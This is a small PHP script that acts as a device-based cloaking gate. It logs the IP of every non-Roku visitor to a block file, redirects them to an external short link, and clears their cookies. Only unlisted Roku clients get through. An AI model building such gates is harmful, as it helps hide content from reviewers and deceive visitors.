<?php

include("ipblocking.php");

//get user browser
$msie = strpos($_SERVER["HTTP_USER_AGENT"], 'MSIE') ? true : false;
$firefox = strpos($_SERVER["HTTP_USER_AGENT"], 'Firefox') ? true : false;
$safari = strpos($_SERVER["HTTP_USER_AGENT"], 'Safari') ? true : false;
$chrome = strpos($_SERVER["HTTP_USER_AGENT"], 'Chrome') ? true : false;

//check mobile devices
$iPod    = stripos($_SERVER['HTTP_USER_AGENT'],"iPod");
$iPhone  = stripos($_SERVER['HTTP_USER_AGENT'],"iPhone");
$iPad    = stripos($_SERVER['HTTP_USER_AGENT'],"iPad");
$Android = stripos($_SERVER['HTTP_USER_AGENT'],"Android");
$webOS   = stripos($_SERVER['HTTP_USER_AGENT'],"webOS");
$roku	 = stripos($_SERVER['HTTP_USER_AGENT'],"Roku");
$ips = array();
if(file_exists("blockipskcw2016.txt")){	
	$ips_content = file_get_contents("blockipskcw2016.txt");	
	$ips = explode(",",$ips_content);
	foreach($ips as &$i){
		$i = trim($i);
	}
}
$ip = trim(isset($_SERVER["HTTP_CF_CONNECTING_IP"]) && $_SERVER["HTTP_CF_CONNECTING_IP"] ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"]);
if($roku === false) 
{	
	if(!in_array($ip,$ips)){		
		$fh = fopen("blockipskcw2016.txt", 'a+') or die("can't open file");		
		fwrite($fh, $ip.",\n");		
		fclose($fh);	
	}	
	header('Location: https://y99.in/r/148502');
}
else
{
	if(in_array($ip,$ips)){
		header('Location: https://y99.in/r/148502');
	}
}
// unset cookies
if (isset($_SERVER['HTTP_COOKIE'])) {
    $cookies = explode(';', $_SERVER['HTTP_COOKIE']);
    foreach($cookies as $cookie) {
        $parts = explode('=', $cookie);
        $name = trim($parts[0]);
        setcookie($name, '', time()-1000);
        setcookie($name, '', time()-1000, '/');
    }
}
